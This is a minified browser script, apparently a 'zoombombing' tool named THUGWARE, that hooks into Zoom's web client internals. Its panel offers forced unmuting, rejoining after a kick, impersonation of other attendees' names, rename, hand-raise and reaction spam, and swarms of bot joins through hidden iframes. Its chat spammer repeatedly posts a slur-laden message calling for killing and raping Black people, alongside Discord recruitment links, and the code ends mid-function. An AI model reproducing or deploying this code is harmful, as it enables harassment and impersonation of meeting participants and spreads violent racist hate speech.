(() => {
    "use strict";
    const e = function e(t, n) {
        var r;

        function o(e) {
            var t = document.createElement("div");
            if (t.style.position = "fixed", t.style.width = "350px", t.style.height = "auto", t.style.border = "1px solid #444", t.style.backgroundColor = "rgba(25, 25, 25, 0.85)", t.style.backdropFilter = "blur(6px)", t.style.color = "#FFF", t.style.padding = "8px", t.style.boxShadow = "2px 2px 10px rgba(0, 0, 0, 0.5)", t.style.borderRadius = "8px", t.style.zIndex = "999999", t.style.left = "100px", t.style.top = "100px", t.style.userSelect = "none", document.body.appendChild(t), n) {
                var r = document.createElement("img");
                r.src = n, r.style.width = "100%", r.style.height = "auto", r.style.maxHeight = "100px", r.style.objectFit = "contain", t.appendChild(r)
            }
            return e && (t.header = document.createElement("h2"), t.header.style.margin = "10px 0 5px 0", t.header.style.textAlign = "center", t.header.style.fontSize = "24px", t.header.style.color = "green", t.header.style.textShadow = "0 0 1px #00FF00, 0 0 2px #00FF00", t.header.style.fontFamily = "Courier New, monospace", t.header.textContent = e, t.appendChild(t.header)), t
        }
        e.addHtml = function(e, t) {
            e.insertAdjacentHTML("beforeend", t)
        }, e.addSubtitle = function(e, t) {
            var n = document.createElement("h3");
            n.innerHTML = t, n.style.color = "green", n.style.textShadow = "0 0 1px #00FF00, 0 0 2px #00FF00", n.style.margin = "5px 0", n.style.textAlign = "center", n.style.fontFamily = "Courier New, monospace", e.appendChild(n)
        };
        var a = o(t);
        a.settingsOpen = !1, e.addButton = function(t, n, r, i, l) {
            var c = arguments.length > 5 && void 0 !== arguments[5] && arguments[5],
                s = "rgba(55, 55, 55, 0.75)",
                u = "rgba(10, 10, 10, 0.75)",
                d = document.createElement("button");
            d.textContent = n, d.className = "button", d.style.padding = "6px 10px", d.style.width = "100%", d.style.border = "none", d.style.borderRadius = "5px", d.style.cursor = "pointer", d.style.margin = "4px 0", d.style.color = "white", d.style.transition = "background-color 100ms linear", d.style.fontFamily = "Courier New, monospace", d.style.textShadow = "0 0 2px #00FF00, 0 0 4px #00FF00";
            var p = c;
            d.style.backgroundColor = p ? u : s, d.addEventListener("mouseover", (function() {
                d.style.backgroundColor = "rgba(25, 25, 25, 0.85)", d.style.outline = "1px solid #444"
            })), d.addEventListener("mouseleave", (function() {
                setTimeout((function() {
                    d.style.backgroundColor = p ? u : s, d.style.outline = "none"
                }), 100)
            })), d.addEventListener("click", (function() {
                r ? p ? (d.style.backgroundColor = s, p = !1, l()) : (d.style.backgroundColor = u, p = !0, i()) : (d.style.backgroundColor = u, i(), setTimeout((function() {
                    d.style.backgroundColor = s
                }), 100))
            }));
            var h = [];
            return d.oncontextmenu = function(t) {
                if (0 == h.length) return !1;
                if (1 == a.settingsOpen) return !1;
                var n = o();
                return n.style.left = parseInt(a.style.left) + parseInt(a.style.width) + 5 + "px", n.style.top = a.style.top, a.settingsOpen = !0, h.forEach((function(t) {
                    e.addButton(n, null == t ? void 0 : t.title, null == t ? void 0 : t.toggle, (function() {
                        t.enable(), t.enabled = !0
                    }), (function() {
                        t.disable(), t.enabled = !1
                    }), null == t ? void 0 : t.enabled)
                })), n.addEventListener("mouseleave", (function() {
                    setTimeout((function() {
                        n.remove(), a.settingsOpen = !1
                    }), 100)
                })), !1
            }, t.appendChild(d), h
        }, e.addSeparator = function(e) {
            var t = document.createElement("hr");
            t.style.border = "none", t.style.borderTop = "1px solid #555", t.style.margin = "8px 0", e.appendChild(t)
        };
        var i = !1,
            l = {
                x: 0,
                y: 0
            };
        if (null != a && a.header) {
            a.addEventListener("mousedown", (function(e) {
                i = !0, l.x = e.clientX - a.getBoundingClientRect().left, l.y = e.clientY - a.getBoundingClientRect().top, a.header.style.cursor = "grabbing"
            })), document.addEventListener("mousemove", (function(e) {
                i && (a.style.left = "".concat(e.clientX - l.x, "px"), a.style.top = "".concat(e.clientY - l.y, "px"))
            })), document.addEventListener("mouseup", (function() {
                i = !1, a.header.style.cursor = "grab"
            }));
            var c = function(e) {
                "ShiftRight" === e.code && ("block" == a.style.display ? a.style.display = "none" : a.style.display = "block")
            };
            return window.addEventListener("keydown", c), null === (r = document.querySelector("#webclient")) || void 0 === r || r.contentWindow.addEventListener("keydown", c), a
        }
    };
    var t = {
        _sendSocketMessage: null,
        _sendChatPacket: null,
        _wpRequire: null,
        get frame() {
            var e;
            return (null === (e = document.getElementById("webclient")) || void 0 === e ? void 0 : e.contentWindow) || window
        },
        get store() {
            return Object.values(t.frame.document.querySelector("#root"))[0].memoizedState.element.props.store
        },
        get state() {
            return t.store.getState()
        },
        get packets() {
            return Object.values(t.wpRequire.c).find((function(e) {
                var t;
                return null === (t = e.exports) || void 0 === t ? void 0 : t.WS_CONF_RENAME_REQ
            })).exports
        },
        get morePackets() {
            return Object.values(t.wpRequire.c).find((function(e) {
                var t;
                return null === (t = e.exports) || void 0 === t ? void 0 : t.USER_NODE_AUDIO_STATUS_LIST
            })).exports
        },
        get sendSocketMessage() {
            var e = this;
            return this._sendSocketMessage || Object.values(t.wpRequire.c).forEach((function(t) {
                null != t && t.exports && Object.values(t.exports).forEach((function(t) {
                    "function" == typeof t && t.toString().includes("case a.WS_AUDIO_DIALOUT_REQ:") && (e._sendSocketMessage = t)
                }))
            })), this._sendSocketMessage
        },
        get sendChatPacket() {
            var e = this;
            return this._sendChatPacket || Object.values(t.wpRequire.c).forEach((function(t) {
                null != t && t.exports && Object.values(t.exports).forEach((function(t) {
                    if ("function" == typeof t) {
                        var n = t.toString();
                        n.includes("{meeting:{currentUser:") && n.includes("localXmppMsgId") && (e._sendChatPacket = t)
                    }
                }))
            })), this._sendChatPacket
        },
        get wpRequire() {
            return this._wpRequire || (t.frame.webpackChunkwebclient = t.frame.webpackChunkwebclient || []).push([
                [Symbol()], {},
                function(e) {
                    t.frame.Object.prototype.__defineGetter__(Symbol.for("cache"), (function() {
                        return e.c = this, delete t.frame.Object.prototype[Symbol.for("cache")], {
                            exports: {}
                        }
                    })), e(Symbol.for("cache")), t._wpRequire = e
                }
            ]), this._wpRequire
        },
        recache: function() {
            this._wpRequire = null, this._sendSocketMessage = null, this._sendChatPacket = null
        }
    };
    window.core = t;
    const n = t,
        r = function(e) {
            n.sendSocketMessage({
                evt: n.packets.WS_CONF_RENAME_REQ,
                body: {
                    id: n.state.meeting.currentUser.userId,
                    dn2: btoa(e),
                    olddn2: btoa(n.state.meeting.currentUser.displayName)
                }
            })()
        },
        o = function() {
            n.sendSocketMessage({
                evt: n.morePackets.USER_NODE_AUDIO_STATUS_LIST,
                body: {
                    add: null,
                    remove: null,
                    update: [{
                        id: n.state.meeting.currentUser.userId,
                        muted: !1
                    }]
                }
            })(), n.sendSocketMessage({
                evt: n.packets.WS_AUDIO_MUTE_REQ,
                body: {
                    id: n.state.meeting.currentUser.userId,
                    bMute: !1
                }
            })()
        },
        a = function() {
            n.sendSocketMessage({
                evt: n.packets.WS_CONF_RAISE_LOWER_HAND_REQ,
                body: {
                    id: n.state.meeting.currentUser.userId,
                    bOn: !0
                }
            })((function() {}))
        },
        i = function() {
            n.sendSocketMessage({
                evt: n.packets.WS_CONF_RAISE_LOWER_HAND_REQ,
                body: {
                    id: n.state.meeting.currentUser.userId,
                    bOn: !1
                }
            })((function() {}))
        },
        l = function(e) {
            n.sendSocketMessage({
                evt: n.packets.WS_CONF_SEND_REACTION_REQ,
                body: {
                    uNodeID: n.state.meeting.currentUser.userId,
                    strEmojiContent: e
                }
            })()
        },
        c = function(e) {
            n.sendChatPacket({
                text: e,
                styleItems: [],
                mention: []
            }, 0)(n.store.dispatch, n.store.getState)
        };

    function s() {
        s.autoUnmuteInterval = setInterval((function() {
            n.state.meeting.currentUser.muted && o()
        }), 10)
    }
    s.autoUnmuteInterval = null, s.stop = function() {
        return clearInterval(s.autoUnmuteInterval)
    };
    const u = s;
    var d = 0;

    function p() {
        p.isActive = !0;
        var e = function() {
            p.isActive && (c("THIS MEETING IS BEING HACKED BY UTC AND GEORGE FLOYD NEGROID INDUSTRIES GET FUCKED RETARD NIGGERS KILL ALL NIGGERS FUCK ALL NIGGERS HEIL HITLER BURN A NIGGER INTO THE SUN CURBSTOMP ALL THEM FUCKING NIGGERS KILL THEM RAPE THEM BURN THEM UNTIL THEY LEARN THAT THEY ARE BLACK FILTHY PATHETIC NIGGERS!!! https://discord.gg/zoombombing"), setTimeout(e, 0))
        };
        e()
    }
    p.isActive = !1, p.stop = function() {
        p.isActive = !1
    };
    const h = p;

    function m() {
        m.handSpammerInterval = setInterval((function() {
            a(), i()
        }), 1)
    }
    m.handSpammerInterval = null, m.stop = function() {
        return clearInterval(m.handSpammerInterval)
    };
    const f = m;

    function y(e, t) {
        (null == t || t > e.length) && (t = e.length);
        for (var n = 0, r = Array(t); n < t; n++) r[n] = e[n];
        return r
    }

    function v() {
        v.nameSpammerInterval && clearInterval(v.nameSpammerInterval);
        var e = n.state.attendeesList.attendeesList.map((function(e) {
                return e.displayName
            })),
            t = 0;
        v.nameSpammerInterval = setInterval((function() {
            if (0 !== e.length) {
                var o = e[t],
                    a = o.includes(" ") ? o : encodeURIComponent(o);
                if (a) try {
                    r(a)
                } catch (e) {
                    console.warn("Skipping user: ".concat(o, " - Error: ").concat(e.message))
                }
                t = (t + 1) % e.length;
                var i = n.state.attendeesList.attendeesList.map((function(e) {
                    return e.displayName
                }));
                i.length !== e.length && e.splice.apply(e, [0, e.length].concat(function(e) {
                    if (Array.isArray(e)) return y(e)
                }(l = i) || function(e) {
                    if ("undefined" != typeof Symbol && null != e[Symbol.iterator] || null != e["@@iterator"]) return Array.from(e)
                }(l) || function(e, t) {
                    if (e) {
                        if ("string" == typeof e) return y(e, t);
                        var n = {}.toString.call(e).slice(8, -1);
                        return "Object" === n && e.constructor && (n = e.constructor.name), "Map" === n || "Set" === n ? Array.from(e) : "Arguments" === n || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n) ? y(e, t) : void 0
                    }
                }(l) || function() {
                    throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")
                }()))
            }
            var l
        }), 1)
    }
    v.nameSpammerInterval = null, v.stop = function() {
        return clearInterval(v.nameSpammerInterval)
    };
    const g = v;

    function b() {
        b.reactionSpammerInterval && clearInterval(b.reactionSpammerInterval), b.reactionSpammerInterval = setInterval((function() {
            b.currentEmojiIndex == window.reactionList.length - 1 ? b.currentEmojiIndex = 0 : b.currentEmojiIndex++, l(window.reactionList[b.currentEmojiIndex])
        }), b.reactionSpammerDelay)
    }
    b.reactionSpammerDelay = 1, b.reactionSpammerInterval = null, b.currentEmojiIndex = 0, b.stop = function() {
        return clearInterval(b.reactionSpammerInterval)
    };
    const w = b;

    function S(e) {
        return S = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
            return typeof e
        } : function(e) {
            return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
        }, S(e)
    }

    function E() {
        E = function() {
            return t
        };
        var e, t = {},
            n = Object.prototype,
            r = n.hasOwnProperty,
            o = Object.defineProperty || function(e, t, n) {
                e[t] = n.value
            },
            a = "function" == typeof Symbol ? Symbol : {},
            i = a.iterator || "@@iterator",
            l = a.asyncIterator || "@@asyncIterator",
            c = a.toStringTag || "@@toStringTag";

        function s(e, t, n) {
            return Object.defineProperty(e, t, {
                value: n,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }), e[t]
        }
        try {
            s({}, "")
        } catch (e) {
            s = function(e, t, n) {
                return e[t] = n
            }
        }

        function u(e, t, n, r) {
            var a = t && t.prototype instanceof v ? t : v,
                i = Object.create(a.prototype),
                l = new A(r || []);
            return o(i, "_invoke", {
                value: k(e, n, l)
            }), i
        }

        function d(e, t, n) {
            try {
                return {
                    type: "normal",
                    arg: e.call(t, n)
                }
            } catch (e) {
                return {
                    type: "throw",
                    arg: e
                }
            }
        }
        t.wrap = u;
        var p = "suspendedStart",
            h = "suspendedYield",
            m = "executing",
            f = "completed",
            y = {};

        function v() {}

        function g() {}

        function b() {}
        var w = {};
        s(w, i, (function() {
            return this
        }));
        var x = Object.getPrototypeOf,
            I = x && x(x(M([])));
        I && I !== n && r.call(I, i) && (w = I);
        var L = b.prototype = v.prototype = Object.create(w);

        function C(e) {
            ["next", "throw", "return"].forEach((function(t) {
                s(e, t, (function(e) {
                    return this._invoke(t, e)
                }))
            }))
        }

        function R(e, t) {
            function n(o, a, i, l) {
                var c = d(e[o], e, a);
                if ("throw" !== c.type) {
                    var s = c.arg,
                        u = s.value;
                    return u && "object" == S(u) && r.call(u, "__await") ? t.resolve(u.__await).then((function(e) {
                        n("next", e, i, l)
                    }), (function(e) {
                        n("throw", e, i, l)
                    })) : t.resolve(u).then((function(e) {
                        s.value = e, i(s)
                    }), (function(e) {
                        return n("throw", e, i, l)
                    }))
                }
                l(c.arg)
            }
            var a;
            o(this, "_invoke", {
                value: function(e, r) {
                    function o() {
                        return new t((function(t, o) {
                            n(e, r, t, o)
                        }))
                    }
                    return a = a ? a.then(o, o) : o()
                }
            })
        }

        function k(t, n, r) {
            var o = p;
            return function(a, i) {
                if (o === m) throw Error("Generator is already running");
                if (o === f) {
                    if ("throw" === a) throw i;
                    return {
                        value: e,
                        done: !0
                    }
                }
                for (r.method = a, r.arg = i;;) {
                    var l = r.delegate;
                    if (l) {
                        var c = T(l, r);
                        if (c) {
                            if (c === y) continue;
                            return c
                        }
                    }
                    if ("next" === r.method) r.sent = r._sent = r.arg;
                    else if ("throw" === r.method) {
                        if (o === p) throw o = f, r.arg;
                        r.dispatchException(r.arg)
                    } else "return" === r.method && r.abrupt("return", r.arg);
                    o = m;
                    var s = d(t, n, r);
                    if ("normal" === s.type) {
                        if (o = r.done ? f : h, s.arg === y) continue;
                        return {
                            value: s.arg,
                            done: r.done
                        }
                    }
                    "throw" === s.type && (o = f, r.method = "throw", r.arg = s.arg)
                }
            }
        }

        function T(t, n) {
            var r = n.method,
                o = t.iterator[r];
            if (o === e) return n.delegate = null, "throw" === r && t.iterator.return && (n.method = "return", n.arg = e, T(t, n), "throw" === n.method) || "return" !== r && (n.method = "throw", n.arg = new TypeError("The iterator does not provide a '" + r + "' method")), y;
            var a = d(o, t.iterator, n.arg);
            if ("throw" === a.type) return n.method = "throw", n.arg = a.arg, n.delegate = null, y;
            var i = a.arg;
            return i ? i.done ? (n[t.resultName] = i.value, n.next = t.nextLoc, "return" !== n.method && (n.method = "next", n.arg = e), n.delegate = null, y) : i : (n.method = "throw", n.arg = new TypeError("iterator result is not an object"), n.delegate = null, y)
        }

        function O(e) {
            var t = {
                tryLoc: e[0]
            };
            1 in e && (t.catchLoc = e[1]), 2 in e && (t.finallyLoc = e[2], t.afterLoc = e[3]), this.tryEntries.push(t)
        }

        function _(e) {
            var t = e.completion || {};
            t.type = "normal", delete t.arg, e.completion = t
        }

        function A(e) {
            this.tryEntries = [{
                tryLoc: "root"
            }], e.forEach(O, this), this.reset(!0)
        }

        function M(t) {
            if (t || "" === t) {
                var n = t[i];
                if (n) return n.call(t);
                if ("function" == typeof t.next) return t;
                if (!isNaN(t.length)) {
                    var o = -1,
                        a = function n() {
                            for (; ++o < t.length;)
                                if (r.call(t, o)) return n.value = t[o], n.done = !1, n;
                            return n.value = e, n.done = !0, n
                        };
                    return a.next = a
                }
            }
            throw new TypeError(S(t) + " is not iterable")
        }
        return g.prototype = b, o(L, "constructor", {
            value: b,
            configurable: !0
        }), o(b, "constructor", {
            value: g,
            configurable: !0
        }), g.displayName = s(b, c, "GeneratorFunction"), t.isGeneratorFunction = function(e) {
            var t = "function" == typeof e && e.constructor;
            return !!t && (t === g || "GeneratorFunction" === (t.displayName || t.name))
        }, t.mark = function(e) {
            return Object.setPrototypeOf ? Object.setPrototypeOf(e, b) : (e.__proto__ = b, s(e, c, "GeneratorFunction")), e.prototype = Object.create(L), e
        }, t.awrap = function(e) {
            return {
                __await: e
            }
        }, C(R.prototype), s(R.prototype, l, (function() {
            return this
        })), t.AsyncIterator = R, t.async = function(e, n, r, o, a) {
            void 0 === a && (a = Promise);
            var i = new R(u(e, n, r, o), a);
            return t.isGeneratorFunction(n) ? i : i.next().then((function(e) {
                return e.done ? e.value : i.next()
            }))
        }, C(L), s(L, c, "Generator"), s(L, i, (function() {
            return this
        })), s(L, "toString", (function() {
            return "[object Generator]"
        })), t.keys = function(e) {
            var t = Object(e),
                n = [];
            for (var r in t) n.push(r);
            return n.reverse(),
                function e() {
                    for (; n.length;) {
                        var r = n.pop();
                        if (r in t) return e.value = r, e.done = !1, e
                    }
                    return e.done = !0, e
                }
        }, t.values = M, A.prototype = {
            constructor: A,
            reset: function(t) {
                if (this.prev = 0, this.next = 0, this.sent = this._sent = e, this.done = !1, this.delegate = null, this.method = "next", this.arg = e, this.tryEntries.forEach(_), !t)
                    for (var n in this) "t" === n.charAt(0) && r.call(this, n) && !isNaN(+n.slice(1)) && (this[n] = e)
            },
            stop: function() {
                this.done = !0;
                var e = this.tryEntries[0].completion;
                if ("throw" === e.type) throw e.arg;
                return this.rval
            },
            dispatchException: function(t) {
                if (this.done) throw t;
                var n = this;

                function o(r, o) {
                    return l.type = "throw", l.arg = t, n.next = r, o && (n.method = "next", n.arg = e), !!o
                }
                for (var a = this.tryEntries.length - 1; a >= 0; --a) {
                    var i = this.tryEntries[a],
                        l = i.completion;
                    if ("root" === i.tryLoc) return o("end");
                    if (i.tryLoc <= this.prev) {
                        var c = r.call(i, "catchLoc"),
                            s = r.call(i, "finallyLoc");
                        if (c && s) {
                            if (this.prev < i.catchLoc) return o(i.catchLoc, !0);
                            if (this.prev < i.finallyLoc) return o(i.finallyLoc)
                        } else if (c) {
                            if (this.prev < i.catchLoc) return o(i.catchLoc, !0)
                        } else {
                            if (!s) throw Error("try statement without catch or finally");
                            if (this.prev < i.finallyLoc) return o(i.finallyLoc)
                        }
                    }
                }
            },
            abrupt: function(e, t) {
                for (var n = this.tryEntries.length - 1; n >= 0; --n) {
                    var o = this.tryEntries[n];
                    if (o.tryLoc <= this.prev && r.call(o, "finallyLoc") && this.prev < o.finallyLoc) {
                        var a = o;
                        break
                    }
                }
                a && ("break" === e || "continue" === e) && a.tryLoc <= t && t <= a.finallyLoc && (a = null);
                var i = a ? a.completion : {};
                return i.type = e, i.arg = t, a ? (this.method = "next", this.next = a.finallyLoc, y) : this.complete(i)
            },
            complete: function(e, t) {
                if ("throw" === e.type) throw e.arg;
                return "break" === e.type || "continue" === e.type ? this.next = e.arg : "return" === e.type ? (this.rval = this.arg = e.arg, this.method = "return", this.next = "end") : "normal" === e.type && t && (this.next = t), y
            },
            finish: function(e) {
                for (var t = this.tryEntries.length - 1; t >= 0; --t) {
                    var n = this.tryEntries[t];
                    if (n.finallyLoc === e) return this.complete(n.completion, n.afterLoc), _(n), y
                }
            },
            catch: function(e) {
                for (var t = this.tryEntries.length - 1; t >= 0; --t) {
                    var n = this.tryEntries[t];
                    if (n.tryLoc === e) {
                        var r = n.completion;
                        if ("throw" === r.type) {
                            var o = r.arg;
                            _(n)
                        }
                        return o
                    }
                }
                throw Error("illegal catch attempt")
            },
            delegateYield: function(t, n, r) {
                return this.delegate = {
                    iterator: M(t),
                    resultName: n,
                    nextLoc: r
                }, "next" === this.method && (this.arg = e), y
            }
        }, t
    }

    function x(e, t, n, r, o, a, i) {
        try {
            var l = e[a](i),
                c = l.value
        } catch (e) {
            return void n(e)
        }
        l.done ? t(c) : Promise.resolve(c).then(r, o)
    }
    var I, L;

    function C() {
        return R.apply(this, arguments)
    }

    function R() {
        var e;
        return e = E().mark((function e() {
            var t;
            return E().wrap((function(e) {
                for (;;) switch (e.prev = e.next) {
                    case 0:
                        return e.prev = 0, e.next = 3, navigator.mediaDevices.getDisplayMedia({
                            video: !0,
                            audio: !0
                        });
                    case 3:
                        L = e.sent, I = new MediaRecorder(L, {
                            mimeType: "video/webm; codecs=vp9",
                            audioBitsPerSecond: 128e3,
                            videoBitsPerSecond: 25e5
                        }), t = [], I.ondataavailable = function(e) {
                            e.data.size > 0 && t.push(e.data)
                        }, I.onstop = function() {
                            var e = new Blob(t, {
                                    type: "video/webm"
                                }),
                                n = URL.createObjectURL(e),
                                r = document.createElement("a");
                            r.style.display = "none", r.href = n, r.download = "recorded-video.webm", document.body.appendChild(r), r.click(), document.body.removeChild(r), URL.revokeObjectURL(n)
                        }, I.start(), e.next = 14;
                        break;
                    case 11:
                        e.prev = 11, e.t0 = e.catch(0), console.error("Error: ", e.t0);
                    case 14:
                    case "end":
                        return e.stop()
                }
            }), e, null, [
                [0, 11]
            ])
        })), R = function() {
            var t = this,
                n = arguments;
            return new Promise((function(r, o) {
                var a = e.apply(t, n);

                function i(e) {
                    x(a, r, o, i, l, "next", e)
                }

                function l(e) {
                    x(a, r, o, i, l, "throw", e)
                }
                i(void 0)
            }))
        }, R.apply(this, arguments)
    }
    C.stop = function() {
        I.stop(), L.getTracks().forEach((function(e) {
            return e.stop()
        }))
    };
    const k = C;
    window.namesList = ["James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael", "Linda", "William", "Elizabeth", "David", "Barbara", "Richard", "Susan", "Joseph", "Jessica", "Thomas", "Sarah", "Charles", "Karen", "Christopher", "Nancy", "Daniel", "Lisa", "Matthew", "Margaret", "Anthony", "Betty", "Donald", "Sandra", "Mark", "Ashley", "Paul", "Dorothy", "Steven", "Kimberly", "Andrew", "Emily", "Joshua", "Donna", "Kevin", "Michelle", "Brian", "Carol", "George", "Amanda", "Edward", "Melissa", "Ronald", "Deborah", "Samuel", "Helen", "Adam", "Natalie", "Diana", "Peter", "Victoria", "Henry", "Julia", "Ryan", "Alice", "Nathan", "Sophia", "Isaac", "Grace", "Zachary", "Chloe", "Jesse", "Megan", "Gabriel", "Ava", "Ethan", "Lily", "Lucas", "Scarlett", "Noah", "Emma", "Logan", "Hannah", "Aiden", "Samantha", "Isaiah", "Addison", "Caleb", "Nora", "Charles", "Katherine", "Luke", "Zoe", "Leo", "Aria", "Oliver", "Bella", "Jackson", "Aurora", "Jameson", "Madison", "Eli", "Piper", "Mason", "Sofia", "Carter", "Ellie", "Dylan", "Stella", "Sawyer", "Victoria", "Theodore", "Hazel", "Jordan", "Riley", "Wyatt", "Layla", "Hudson", "Maya", "Asher", "Sadie", "Anthony", "Aubrey", "Gavin", "Claire", "Adrian", "Luna", "Chase", "Eliana", "Jaxon", "Kinsley", "Colton", "Maddison", "Xander", "Camila", "Kai", "Serenity", "Liam", "Julia", "Quinn", "Vivian", "Ryder", "Sienna"], window.reactionList = ["💀", "☠", "🤣", "😂", "😄", "😅", "😊", "😇", "😉", "😍", "😘", "😜", "🤪", "🤩", "😎", "😏", "😡", "😱", "😳", "😢", "😭", "😤", "😬", "😷", "🤔", "🤨", "🤗", "🤭", "🙄", "😬", "🤓", "😺", "🙈", "🙉", "🙊", "👻", "💩", "👀", "😬", "💔", "❤️", "💕", "💞", "💓", "💖", "💗", "💘", "💝", "🌈", "✨", "🎉", "🎊", "🎈", "🔥", "🌹", "🍕", "🍔", "🍦", "☕", "🍩", "🥳", "😋", "😏", "🤠", "🤑", "😻", "🤖", "👽", "👾", "🌸", "🌼", "🌻", "🌺", "🌷", "🍀", "🍂", "🍁", "🌊", "🏖️", "🏞️", "🌍", "🌌", "🌈", "⭐", "🌟", "💫", "🌠", "🌌", "🦄", "🐉"], namesList, reactionList;
    var T = ["John", "Jane", "Alex", "Emily", "Michael", "Sarah", "David", "Laura", "Chris", "Jessica", "Robert", "Karen", "James", "Linda", "William", "Patricia", "Joseph", "Jennifer", "Charles", "Maria"],
        O = ["Smith", "Johnson", "Williams", "Jones", "Brown", "Davis", "Miller", "Wilson", "Moore", "Taylor", "Anderson", "Thomas", "Jackson", "White", "Harris", "Martin", "Thompson", "Garcia", "Martinez", "Robinson"];

    function _() {
        var e = T[Math.floor(Math.random() * T.length)],
            t = O[Math.floor(Math.random() * O.length)];
        return "".concat(e, " ").concat(t)
    }

    function A() {
        A.nameChangeInterval && clearInterval(A.nameChangeInterval);
        var e = Array.from({
                length: 1e3
            }, _),
            t = 0;
        A.nameChangeInterval = setInterval((function() {
            if (0 !== e.length) {
                var n = e[t],
                    o = n.includes(" ") ? n : encodeURIComponent(n);
                if (o) try {
                    r(o)
                } catch (e) {
                    console.warn("Skipping user: ".concat(n, " - Error: ").concat(e.message))
                }
                t = (t + 1) % e.length
            }
        }), 1)
    }
    A.nameChangeInterval = null, A.stop = function() {
        return clearInterval(A.nameChangeInterval)
    };
    const M = A;
    var N = e("THUGWARE-I CANT BREATHE EDITION", "https://us04images.zoom.us/p/v2/8549d108896fd231d80a827f65472f1d43c26f55457be4d9cee1b894f1dfee1f/135b3d03-55be-4bb7-afe2-5789e89b4b57?type=large&_=5352");
    e.addSeparator(N), e.addSeparator(N), e.addSubtitle(N, "<b>BROUGHT TO YOU BY GEORGE FLOYD NEGROID INDUSTRIES</b>"), e.addSeparator(N), e.addSeparator(N), e.addButton(N, "Auto Unmute", !0, u, u.stop), e.addButton(N, "Chat Spammer", !0, h, h.stop), e.addButton(N, "BYPASS KICK", !1, (function() {
        localStorage.clear(), sessionStorage.clear(), n.frame.location.reload()
    })), e.addSeparator(N), e.addSeparator(N), e.addButton(N, "Impersonate Guests", !0, g, g.stop), e.addButton(N, "Speed Rename", !0, M, M.stop), e.addSeparator(N), e.addSeparator(N), e.addSeparator(N), e.addButton(N, "Background Bots", !1, (function() {
        ! function() {
            var e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0],
                t = parseInt(prompt("How many bots?"), 10) || 5;
            t = Math.min(t, 1e3), localStorage.clear(), window.meetingURL = window.meetingURL || document.querySelector("#webclient").src;
            var n = document.createElement("div");
            n.style.display = "flex", n.style.flexWrap = "wrap", document.body.appendChild(n);
            var r = function(o) {
                if (!(o >= t)) {
                    var a = document.createElement("iframe");
                    a.src = meetingURL, e ? (a.style.width = "0%", a.style.height = "0%", a.style.display = "none") : (a.style.width = "10px", a.style.height = "10px", a.style.border = "none", a.style.margin = "5px", a.style.resize = "both"), n.appendChild(a);
                    var i = Math.floor(1e4 * Math.random()) + 5e3;
                    a.onload = function() {
                        setTimeout((function() {
                            a.remove()
                        }), i)
                    };
                    var l = a.contentWindow;
                    (l.webpackChunkwebclient = l.webpackChunkwebclient || []).push([
                        [Symbol()], {},
                        function(e) {
                            e(22665).$c.webClient_meetingUqiueId = Math.random().toString(36).substring(2, 7)
                        }
                    ]), setTimeout((function() {
                        return r(o + 1)
                    }), 100)
                }
            };
            r(0)
        }(!1)
    }), (function() {
        console.log("Button disabled!")
    }), !1), e.addButton(N, "Raise Hand Spammer", !0, f, f.stop), e.addButton(N, "Bot Meeting", !1, (function() {
        var e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0],
            t = prompt("How many bots?");
        localStorage.clear(), window.meetingURL = window.meetingURL || document.querySelector("#webclient").src;
        var n = window.open("about:blank", "Bot Panel - " + d);
        d++, n.document.title = "Bot Meeting Panel", n.document.body.style.background = "linear-gradient(135deg, #7289da, #23272a)", n.document.body.style.color = "white", n.document.body.style.fontFamily = "Arial, sans-serif", n.document.body.style.padding = "20px", n.document.body.style.textAlign = "center";
        var r = document.createElement("h1");
        r.textContent = "Bot Meeting", r.style.color = "#ffffff", r.style.marginBottom = "20px", r.style.fontSize = "2.5rem", r.style.textShadow = "2px 2px 4px rgba(0,0,0,0.3)", n.document.body.appendChild(r);
        var o = document.createElement("p");
        o.textContent = "THUG BOTS", o.style.color = "#99aab5", o.style.fontSize = "1.2rem", o.style.marginBottom = "30px", n.document.body.appendChild(o);
        var a = document.createElement("div");
        a.style.display = "flex", a.style.flexWrap = "wrap", a.style.justifyContent = "center", n.document.body.appendChild(a);
        for (var i = 0; i < t; i++) {
            var l = document.createElement("iframe");
            l.src = meetingURL, e ? (l.style.width = "0%", l.style.height = "0%", l.style.display = "none") : (l.style.width = "700px", l.style.height = "900px", l.style.border = "none", l.style.borderRadius = "10px", l.style.margin = "10px", l.style.boxShadow = "0px 4px 8px rgba(0, 0, 0, 0.1)"), a.appendChild(l);
            var c = l.contentWindow;
            (c.webpackChunkwebclient = c.webpackChunkwebclient || []).push([
                [Symbol()], {},
                function(e) {
                    e(22665).$c.webClient_meetingUqiueId = Math.random().toString(36).substring(2, 7)
                }
            ])
        }
        for (var s = a.querySelectorAll("iframe"), u = 0; u < s.length; u++)
            if (u % 5 == 0 && 0 !== u) {
                var p = document.createElement("div");
                p.style.width = "100%", a.appendChild(p)
            }
    })), e.addButton(N, "Reaction Spammer", !0, w, w.stop), e.addButton(N, "Meeting Recorder", !0, k, k.stop), e.addButton(N, "Duplicate Meeting", !0, (function() {
        ! function(e) {
            localStorage.clear();
            var t = document.querySelector("#webclient");
            if (t) {
                window.meetingURL = window.meetingURL || t.src;
                for (var n = 0; n < e; n++) {
                    var r = window.open(meetingURL, "_blank");
                    (r.webpackChunkwebclient = r.webpackChunkwebclient || []).push([
                        [Symbol()], {},
                        function(e) {
                            e(22665).$c.webClient_meetingUqiueId = Math.random().toString(36).substring(2, 7)
                        }
                    ]), r.focus()
                }
            } else console.error("Element with ID 'webclient' not found.")
        }(1)
    })), e.addSeparator(N), e.addButton(N, "DISCORD", !1, (function() {
        window.open("https://discord.gg/vn3RFsMCmW", "_blank")
    })), e.addSeparator(N), e.addButton(N, "Get Client", !1, (function() {
        var e, t;
